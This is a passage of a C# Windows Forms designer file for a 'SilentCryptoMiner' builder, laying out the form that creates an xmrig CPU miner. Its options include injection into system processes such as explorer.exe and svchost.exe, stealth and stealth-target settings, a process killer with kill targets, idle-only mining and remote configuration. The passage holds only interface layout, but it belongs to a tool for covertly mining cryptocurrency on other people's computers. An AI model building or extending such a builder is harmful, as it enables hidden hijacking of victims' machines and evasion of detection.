using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class MinerXMR : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components = null;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MinerXMR));
            this.formMinerXMR = new MephTheme();
            this.tabcontrolMinerXMR = new MephTabcontrol();
            this.tabConnection = new System.Windows.Forms.TabPage();
            this.labelMinerInjectTarget = new System.Windows.Forms.Label();
            this.comboInjection = new MephComboBox();
            this.labelMinerConnectionPool = new System.Windows.Forms.Label();
            this.txtPoolUsername = new MephTextBox();
            this.txtPoolURL = new MephTextBox();
            this.labelMinerConnectionWallet = new System.Windows.Forms.Label();
            this.labelMinerConnectionPassword = new System.Windows.Forms.Label();
            this.txtPoolPassword = new MephTextBox();
            this.tabMining = new System.Windows.Forms.TabPage();
            this.labelMinerMiningProcessKiller = new System.Windows.Forms.Label();
            this.toggleProcessKiller = new MephToggleSwitch();
            this.labelMinerMiningAlgorithm = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.labelMinerMiningStealth = new System.Windows.Forms.Label();
            this.toggleStealth = new MephToggleSwitch();
            this.labelMinerMiningIdleMinutes = new System.Windows.Forms.Label();
            this.labelMinerMiningIdleWait = new System.Windows.Forms.Label();
            this.comboIdleCPU = new MephComboBox();
            this.comboMaxCPU = new MephComboBox();
            this.labelMinerMiningIdleCPU = new System.Windows.Forms.Label();
            this.labelMinerMiningSSL = new System.Windows.Forms.Label();
            this.toggleSSL = new MephToggleSwitch();
            this.labelMinerMiningNicehash = new System.Windows.Forms.Label();
            this.toggleNicehash = new MephToggleSwitch();
            this.labelMinerMiningIdle = new System.Windows.Forms.Label();
            this.toggleIdle = new MephToggleSwitch();
            this.labelMinerMiningMaxCPU = new System.Windows.Forms.Label();
            this.txtIdleWait = new MephTextBox();
            this.tabAdvanced = new System.Windows.Forms.TabPage();
            this.toggleStealthFullscreen = new MephToggleSwitch();
            this.labelMinerAdvancedStealthFullscreen = new System.Windows.Forms.Label();
            this.chkAPI = new MephCheckBox();
            this.labelMinerAdvancedKillTargets = new System.Windows.Forms.Label();
            this.labelMinerAdvancedStealthTargets = new System.Windows.Forms.Label();
            this.chkAdvParam = new MephCheckBox();
            this.chkRemoteConfig = new MephCheckBox();
            this.txtAPI = new MephTextBox();
            this.txtKillTargets = new MephTextBox();
            this.txtStealthTargets = new MephTextBox();
            this.txtAdvParam = new MephTextBox();
            this.txtRemoteConfig = new MephTextBox();
            this.tabJSON = new System.Windows.Forms.TabPage();
            this.txtJSON = new MephTextBox();
            this.formMinerXMR.SuspendLayout();
            this.tabcontrolMinerXMR.SuspendLayout();
            this.tabConnection.SuspendLayout();
            this.tabMining.SuspendLayout();
            this.tabAdvanced.SuspendLayout();
            this.tabJSON.SuspendLayout();
            this.SuspendLayout();
            // 
            // formMinerXMR
            // 
            this.formMinerXMR.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.formMinerXMR.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formMinerXMR.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formMinerXMR.Controls.Add(this.tabcontrolMinerXMR);
            this.formMinerXMR.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formMinerXMR.ForeColor = System.Drawing.Color.Gray;
            this.formMinerXMR.Location = new System.Drawing.Point(0, 0);
            this.formMinerXMR.Margin = new System.Windows.Forms.Padding(2);
            this.formMinerXMR.MaximumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.MinimumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.Name = "formMinerXMR";
            this.formMinerXMR.Size = new System.Drawing.Size(535, 272);
            this.formMinerXMR.SubHeader = "Create a new miner (xmrig - CPU)";
            this.formMinerXMR.TabIndex = 0;
            this.formMinerXMR.Text = "Create New Miner";
            // 
            // tabcontrolMinerXMR
            // 
            this.tabcontrolMinerXMR.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolMinerXMR.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolMinerXMR.Controls.Add(this.tabConnection);
            this.tabcontrolMinerXMR.Controls.Add(this.tabMining);
            this.tabcontrolMinerXMR.Controls.Add(this.tabAdvanced);
            this.tabcontrolMinerXMR.Controls.Add(this.tabJSON);
            this.tabcontrolMinerXMR.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolMinerXMR.ItemSize = new System.Drawing.Size(32, 85);
            this.tabcontrolMinerXMR.Location = new System.Drawing.Point(12, 65);
            this.tabcontrolMinerXMR.Multiline = true;
            this.tabcontrolMinerXMR.Name = "tabcontrolMinerXMR";
            this.tabcontrolMinerXMR.SelectedIndex = 0;
            this.tabcontrolMinerXMR.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolMinerXMR.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolMinerXMR.TabIndex = 17;
            this.tabcontrolMinerXMR.SelectedIndexChanged += new System.EventHandler(this.tabcontrolMinerXMR_SelectedIndexChanged);
            // 
            // tabConnection
            // 
            this.tabConnection.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabConnection.Controls.Add(this.labelMinerInjectTarget);
            this.tabConnection.Controls.Add(this.comboInjection);
            this.tabConnection.Controls.Add(this.labelMinerConnectionPool);
            this.tabConnection.Controls.Add(this.txtPoolUsername);
            this.tabConnection.Controls.Add(this.txtPoolURL);
            this.tabConnection.Controls.Add(this.labelMinerConnectionWallet);
            this.tabConnection.Controls.Add(this.labelMinerConnectionPassword);
            this.tabConnection.Controls.Add(this.txtPoolPassword);
            this.tabConnection.Location = new System.Drawing.Point(89, 4);
            this.tabConnection.Name = "tabConnection";
            this.tabConnection.Size = new System.Drawing.Size(418, 189);
            this.tabConnection.TabIndex = 0;
            this.tabConnection.Text = "Connection";
            // 
            // labelMinerInjectTarget
            // 
            this.labelMinerInjectTarget.AutoEllipsis = true;
            this.labelMinerInjectTarget.Location = new System.Drawing.Point(8, 158);
            this.labelMinerInjectTarget.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerInjectTarget.Name = "labelMinerInjectTarget";
            this.labelMinerInjectTarget.Size = new System.Drawing.Size(67, 17);
            this.labelMinerInjectTarget.TabIndex = 19;
            this.labelMinerInjectTarget.Text = "Inject Into:";
            // 
            // comboInjection
            // 
            this.comboInjection.BackColor = System.Drawing.Color.Transparent;
            this.comboInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboInjection.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboInjection.ForeColor = System.Drawing.Color.Silver;
            this.comboInjection.FormattingEnabled = true;
            this.comboInjection.ItemHeight = 16;
            this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboInjection.Items.AddRange(new object[] {
            "conhost.exe",
            "explorer.exe",
            "nslookup.exe",
            "cmd.exe",
            "notepad.exe",
            "svchost.exe",
            "dwm.exe"});
            this.comboInjection.Location = new System.Drawing.Point(79, 156);
            this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
            this.comboInjection.Name = "comboInjection";
            this.comboInjection.Size = new System.Drawing.Size(327, 22);
            this.comboInjection.StartIndex = 0;
            this.comboInjection.TabIndex = 18;
            // 
            // labelMinerConnectionPool
            // 
            this.labelMinerConnectionPool.AutoSize = true;
            this.labelMinerConnectionPool.Location = new System.Drawing.Point(8, 8);
            this.labelMinerConnectionPool.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerConnectionPool.Name = "labelMinerConnectionPool";
            this.labelMinerConnectionPool.Size = new System.Drawing.Size(37, 17);
            this.labelMinerConnectionPool.TabIndex = 15;
            this.labelMinerConnectionPool.Text = "Pool:";
            // 
            // txtPoolUsername
            // 
            this.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolUsername.Location = new System.Drawing.Point(11, 77);
            this.txtPoolUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolUsername.MaxLength = 32767;
            this.txtPoolUsername.MultiLine = false;
            this.txtPoolUsername.Name = "txtPoolUsername";
            this.txtPoolUsername.ReadOnly = false;
            this.txtPoolUsername.Size = new System.Drawing.Size(395, 24);
            this.txtPoolUsername.TabIndex = 10;
            this.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolUsername.UseSystemPasswordChar = false;
            this.txtPoolUsername.WordWrap = false;
            // 
            // txtPoolURL
            // 
            this.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolURL.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolURL.Location = new System.Drawing.Point(12, 29);
            this.txtPoolURL.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolURL.MaxLength = 32767;
            this.txtPoolURL.MultiLine = false;
            this.txtPoolURL.Name = "txtPoolURL";
            this.txtPoolURL.ReadOnly = false;
            this.txtPoolURL.Size = new System.Drawing.Size(394, 24);
            this.txtPoolURL.TabIndex = 14;
            this.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolURL.UseSystemPasswordChar = false;
            this.txtPoolURL.WordWrap = false;
            // 
            // labelMinerConnectionWallet
            // 
            this.labelMinerConnectionWallet.AutoSize = true;
            this.labelMinerConnectionWallet.Location = new System.Drawing.Point(9, 55);
            this.labelMinerConnectionWallet.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerConnectionWallet.Name = "labelMinerConnectionWallet";
            this.labelMinerConnectionWallet.Size = new System.Drawing.Size(130, 17);
            this.labelMinerConnectionWallet.TabIndex = 11;
            this.labelMinerConnectionWallet.Text = "Wallet Address/User:";
            // 
            // labelMinerConnectionPassword
            // 
            this.labelMinerConnectionPassword.AutoSize = true;
            this.labelMinerConnectionPassword.Location = new System.Drawing.Point(9, 102);
            this.labelMinerConnectionPassword.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerConnectionPassword.Name = "labelMinerConnectionPassword";
            this.labelMinerConnectionPassword.Size = new System.Drawing.Size(140, 17);
            this.labelMinerConnectionPassword.TabIndex = 13;
            this.labelMinerConnectionPassword.Text = "Password (if required):";
            // 
            // txtPoolPassword
            // 
            this.txtPoolPassword.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolPassword.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolPassword.Location = new System.Drawing.Point(12, 122);
            this.txtPoolPassword.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolPassword.MaxLength = 32767;
            this.txtPoolPassword.MultiLine = false;
            this.txtPoolPassword.Name = "txtPoolPassword";
            this.txtPoolPassword.ReadOnly = false;
            this.txtPoolPassword.Size = new System.Drawing.Size(394, 24);
            this.txtPoolPassword.TabIndex = 12;
            this.txtPoolPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolPassword.UseSystemPasswordChar = false;
            this.txtPoolPassword.WordWrap = false;
            // 
            // tabMining
            // 
            this.tabMining.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMining.Controls.Add(this.labelMinerMiningProcessKiller);
            this.tabMining.Controls.Add(this.toggleProcessKiller);
            this.tabMining.Controls.Add(this.labelMinerMiningAlgorithm);
            this.tabMining.Controls.Add(this.comboAlgorithm);
            this.tabMining.Controls.Add(this.labelMinerMiningStealth);
            this.tabMining.Controls.Add(this.toggleStealth);
            this.tabMining.Controls.Add(this.labelMinerMiningIdleMinutes);
            this.tabMining.Controls.Add(this.labelMinerMiningIdleWait);
            this.tabMining.Controls.Add(this.comboIdleCPU);
            this.tabMining.Controls.Add(this.comboMaxCPU);
            this.tabMining.Controls.Add(this.labelMinerMiningIdleCPU);
            this.tabMining.Controls.Add(this.labelMinerMiningSSL);
            this.tabMining.Controls.Add(this.toggleSSL);
            this.tabMining.Controls.Add(this.labelMinerMiningNicehash);
            this.tabMining.Controls.Add(this.toggleNicehash);
            this.tabMining.Controls.Add(this.labelMinerMiningIdle);
            this.tabMining.Controls.Add(this.toggleIdle);
            this.tabMining.Controls.Add(this.labelMinerMiningMaxCPU);
            this.tabMining.Controls.Add(this.txtIdleWait);
            this.tabMining.Location = new System.Drawing.Point(89, 4);
            this.tabMining.Name = "tabMining";
            this.tabMining.Padding = new System.Windows.Forms.Padding(3);
            this.tabMining.Size = new System.Drawing.Size(418, 189);
            this.tabMining.TabIndex = 5;
            this.tabMining.Text = "Mining";
            // 
            // labelMinerMiningProcessKiller
            // 
            this.labelMinerMiningProcessKiller.AutoEllipsis = true;
            this.labelMinerMiningProcessKiller.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningProcessKiller.Location = new System.Drawing.Point(11, 93);
            this.labelMinerMiningProcessKiller.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningProcessKiller.Name = "labelMinerMiningProcessKiller";
            this.labelMinerMiningProcessKiller.Size = new System.Drawing.Size(115, 17);
            this.labelMinerMiningProcessKiller.TabIndex = 129;
            this.labelMinerMiningProcessKiller.Text = "Process Killer:";
            // 
            // toggleProcessKiller
            // 
            this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessKiller.Checked = false;
            this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessKiller.Location = new System.Drawing.Point(130, 90);
            this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessKiller.Name = "toggleProcessKiller";
            this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessKiller.TabIndex = 128;
            // 
            // labelMinerMiningAlgorithm
            // 
            this.labelMinerMiningAlgorithm.AutoSize = true;
            this.labelMinerMiningAlgorithm.Location = new System.Drawing.Point(255, 141);
            this.labelMinerMiningAlgorithm.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningAlgorithm.Name = "labelMinerMiningAlgorithm";
            this.labelMinerMiningAlgorithm.Size = new System.Drawing.Size(68, 17);
            this.labelMinerMiningAlgorithm.TabIndex = 70;
            this.labelMinerMiningAlgorithm.Text = "Algorithm:";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "rx/0",
            "gr",
            "cn/upx2",
            "argon2/chukwav2",
            "cn/ccx",
            "rx/keva",
            "cn-pico/tlo",
            "rx/sfx",
            "rx/arq",
            "rx/graft",
            "argon2/chukwa",
            "argon2/ninja",
            "rx/wow",
            "cn/fast",
            "cn/rwz",
            "cn/zls",
            "cn/double",
            "cn/r",
            "cn-pico",
            "cn/half",
            "cn/2",
            "cn/xao",
            "cn/rto",
            "cn-heavy/tube",
            "cn-heavy/xhv",
            "cn-heavy/0",
            "cn/1",
            "cn-lite/1",
            "cn-lite/0",
            "cn/0"});
            this.comboAlgorithm.Location = new System.Drawing.Point(256, 160);
            this.comboAlgorithm.Margin = new System.Windows.Forms.Padding(2);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(151, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 69;
            this.comboAlgorithm.SelectedIndexChanged += new System.EventHandler(this.comboAlgorithm_SelectedIndexChanged);
            // 
            // labelMinerMiningStealth
            // 
            this.labelMinerMiningStealth.AutoEllipsis = true;
            this.labelMinerMiningStealth.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningStealth.Location = new System.Drawing.Point(11, 66);
            this.labelMinerMiningStealth.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningStealth.Name = "labelMinerMiningStealth";
            this.labelMinerMiningStealth.Size = new System.Drawing.Size(115, 17);
            this.labelMinerMiningStealth.TabIndex = 56;
            this.labelMinerMiningStealth.Text = "Stealth:";
            // 
            // toggleStealth
            // 
            this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealth.Checked = false;
            this.toggleStealth.ForeColor = System.Drawing.Color.Black;
            this.toggleStealth.Location = new System.Drawing.Point(131, 63);
            this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealth.Name = "toggleStealth";
            this.toggleStealth.Size = new System.Drawing.Size(50, 24);
            this.toggleStealth.TabIndex = 55;
            // 
            // labelMinerMiningIdleMinutes
            // 
            this.labelMinerMiningIdleMinutes.AutoSize = true;
            this.labelMinerMiningIdleMinutes.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningIdleMinutes.Location = new System.Drawing.Point(357, 97);
            this.labelMinerMiningIdleMinutes.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningIdleMinutes.Name = "labelMinerMiningIdleMinutes";
            this.labelMinerMiningIdleMinutes.Size = new System.Drawing.Size(54, 17);
            this.labelMinerMiningIdleMinutes.TabIndex = 53;
            this.labelMinerMiningIdleMinutes.Text = "Minutes";
            // 
            // labelMinerMiningIdleWait
            // 
            this.labelMinerMiningIdleWait.AutoEllipsis = true;
            this.labelMinerMiningIdleWait.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningIdleWait.Location = new System.Drawing.Point(253, 98);
            this.labelMinerMiningIdleWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningIdleWait.Name = "labelMinerMiningIdleWait";
            this.labelMinerMiningIdleWait.Size = new System.Drawing.Size(73, 17);
            this.labelMinerMiningIdleWait.TabIndex = 52;
            this.labelMinerMiningIdleWait.Text = "Idle Wait:";
            // 
            // comboIdleCPU
            // 
            this.comboIdleCPU.BackColor = System.Drawing.Color.Transparent;
            this.comboIdleCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboIdleCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboIdleCPU.Enabled = false;
            this.comboIdleCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboIdleCPU.ForeColor = System.Drawing.Color.Silver;
            this.comboIdleCPU.FormattingEnabled = true;
            this.comboIdleCPU.ItemHeight = 16;
            this.comboIdleCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboIdleCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboIdleCPU.Location = new System.Drawing.Point(347, 67);
            this.comboIdleCPU.Name = "comboIdleCPU";
            this.comboIdleCPU.Size = new System.Drawing.Size(60, 22);
            this.comboIdleCPU.StartIndex = 8;
            this.comboIdleCPU.TabIndex = 49;
            // 
            // comboMaxCPU
            // 
            this.comboMaxCPU.BackColor = System.Drawing.Color.Transparent;
            this.comboMaxCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboMaxCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboMaxCPU.ForeColor = System.Drawing.Color.Silver;
            this.comboMaxCPU.FormattingEnabled = true;
            this.comboMaxCPU.ItemHeight = 16;
            this.comboMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboMaxCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboMaxCPU.Location = new System.Drawing.Point(347, 39);
            this.comboMaxCPU.Name = "comboMaxCPU";
            this.comboMaxCPU.Size = new System.Drawing.Size(60, 22);
            this.comboMaxCPU.StartIndex = 2;
            this.comboMaxCPU.TabIndex = 26;
            // 
            // labelMinerMiningIdleCPU
            // 
            this.labelMinerMiningIdleCPU.AutoEllipsis = true;
            this.labelMinerMiningIdleCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningIdleCPU.Location = new System.Drawing.Point(253, 70);
            this.labelMinerMiningIdleCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningIdleCPU.Name = "labelMinerMiningIdleCPU";
            this.labelMinerMiningIdleCPU.Size = new System.Drawing.Size(89, 17);
            this.labelMinerMiningIdleCPU.TabIndex = 48;
            this.labelMinerMiningIdleCPU.Text = "Idle CPU:";
            // 
            // labelMinerMiningSSL
            // 
            this.labelMinerMiningSSL.AutoEllipsis = true;
            this.labelMinerMiningSSL.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningSSL.Location = new System.Drawing.Point(11, 12);
            this.labelMinerMiningSSL.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningSSL.Name = "labelMinerMiningSSL";
            this.labelMinerMiningSSL.Size = new System.Drawing.Size(115, 17);
            this.labelMinerMiningSSL.TabIndex = 42;
            this.labelMinerMiningSSL.Text = "SSL/TLS:";
            // 
            // toggleSSL
            // 
            this.toggleSSL.BackColor = System.Drawing.Color.Transparent;
            this.toggleSSL.Checked = false;
            this.toggleSSL.ForeColor = System.Drawing.Color.Black;
            this.toggleSSL.Location = new System.Drawing.Point(130, 9);
            this.toggleSSL.Margin = new System.Windows.Forms.Padding(2);
            this.toggleSSL.Name = "toggleSSL";
            this.toggleSSL.Size = new System.Drawing.Size(50, 24);
            this.toggleSSL.TabIndex = 41;
            // 
            // labelMinerMiningNicehash
            // 
            this.labelMinerMiningNicehash.AutoEllipsis = true;
            this.labelMinerMiningNicehash.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningNicehash.Location = new System.Drawing.Point(11, 39);
            this.labelMinerMiningNicehash.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningNicehash.Name = "labelMinerMiningNicehash";
            this.labelMinerMiningNicehash.Size = new System.Drawing.Size(115, 17);
            this.labelMinerMiningNicehash.TabIndex = 32;
            this.labelMinerMiningNicehash.Text = "Nicehash Mining:";
            // 
            // toggleNicehash
            // 
            this.toggleNicehash.BackColor = System.Drawing.Color.Transparent;
            this.toggleNicehash.Checked = false;
            this.toggleNicehash.ForeColor = System.Drawing.Color.Black;
            this.toggleNicehash.Location = new System.Drawing.Point(131, 36);
            this.toggleNicehash.Margin = new System.Windows.Forms.Padding(2);
            this.toggleNicehash.Name = "toggleNicehash";
            this.toggleNicehash.Size = new System.Drawing.Size(50, 24);
            this.toggleNicehash.TabIndex = 31;
            // 
            // labelMinerMiningIdle
            // 
            this.labelMinerMiningIdle.AutoEllipsis = true;
            this.labelMinerMiningIdle.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningIdle.Location = new System.Drawing.Point(253, 12);
            this.labelMinerMiningIdle.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningIdle.Name = "labelMinerMiningIdle";
            this.labelMinerMiningIdle.Size = new System.Drawing.Size(100, 17);
            this.labelMinerMiningIdle.TabIndex = 30;
            this.labelMinerMiningIdle.Text = "Idle Mining:";
            // 
            // toggleIdle
            // 
            this.toggleIdle.BackColor = System.Drawing.Color.Transparent;
            this.toggleIdle.Checked = false;
            this.toggleIdle.ForeColor = System.Drawing.Color.Black;
            this.toggleIdle.Location = new System.Drawing.Point(357, 9);
            this.toggleIdle.Margin = new System.Windows.Forms.Padding(2);
            this.toggleIdle.Name = "toggleIdle";
            this.toggleIdle.Size = new System.Drawing.Size(50, 24);
            this.toggleIdle.TabIndex = 29;
            this.toggleIdle.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleIdle_CheckedChanged);
            // 
            // labelMinerMiningMaxCPU
            // 
            this.labelMinerMiningMaxCPU.AutoEllipsis = true;
            this.labelMinerMiningMaxCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerMiningMaxCPU.Location = new System.Drawing.Point(253, 42);
            this.labelMinerMiningMaxCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerMiningMaxCPU.Name = "labelMinerMiningMaxCPU";
            this.labelMinerMiningMaxCPU.Size = new System.Drawing.Size(89, 17);
            this.labelMinerMiningMaxCPU.TabIndex = 25;
            this.labelMinerMiningMaxCPU.Text = "Max CPU:";
            // 
            // txtIdleWait
            // 
            this.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIdleWait.Enabled = false;
            this.txtIdleWait.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtIdleWait.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleWait.Location = new System.Drawing.Point(331, 95);
            this.txtIdleWait.MaxLength = 32767;
            this.txtIdleWait.MultiLine = false;
            this.txtIdleWait.Name = "txtIdleWait";
            this.txtIdleWait.ReadOnly = false;
            this.txtIdleWait.Size = new System.Drawing.Size(24, 24);
            this.txtIdleWait.TabIndex = 51;
            this.txtIdleWait.Text = "5";
            this.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtIdleWait.UseSystemPasswordChar = false;
            this.txtIdleWait.WordWrap = false;
            // 
            // tabAdvanced
            // 
            this.tabAdvanced.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabAdvanced.Controls.Add(this.toggleStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.labelMinerAdvancedStealthFullscreen);
            this.tabAdvanced.Controls.Add(this.chkAPI);
            this.tabAdvanced.Controls.Add(this.labelMinerAdvancedKillTargets);
            this.tabAdvanced.Controls.Add(this.labelMinerAdvancedStealthTargets);
            this.tabAdvanced.Controls.Add(this.chkAdvParam);
            this.tabAdvanced.Controls.Add(this.chkRemoteConfig);
            this.tabAdvanced.Controls.Add(this.txtAPI);
            this.tabAdvanced.Controls.Add(this.txtKillTargets);
            this.tabAdvanced.Controls.Add(this.txtStealthTargets);
            this.tabAdvanced.Controls.Add(this.txtAdvParam);
            this.tabAdvanced.Controls.Add(this.txtRemoteConfig);
            this.tabAdvanced.Location = new System.Drawing.Point(89, 4);
            this.tabAdvanced.Name = "tabAdvanced";
            this.tabAdvanced.Size = new System.Drawing.Size(418, 189);
            this.tabAdvanced.TabIndex = 7;
            this.tabAdvanced.Text = "Advanced";
            // 
            // toggleStealthFullscreen
            // 
            this.toggleStealthFullscreen.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealthFullscreen.Checked = false;
            this.toggleStealthFullscreen.ForeColor = System.Drawing.Color.Black;
            this.toggleStealthFullscreen.Location = new System.Drawing.Point(143, 40);
            this.toggleStealthFullscreen.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealthFullscreen.Name = "toggleStealthFullscreen";
            this.toggleStealthFullscreen.Size = new System.Drawing.Size(50, 24);
            this.toggleStealthFullscreen.TabIndex = 130;
            // 
            // labelMinerAdvancedStealthFullscreen
            // 
            this.labelMinerAdvancedStealthFullscreen.AutoEllipsis = true;
            this.labelMinerAdvancedStealthFullscreen.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerAdvancedStealthFullscreen.Location = new System.Drawing.Point(14, 43);
            this.labelMinerAdvancedStealthFullscreen.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
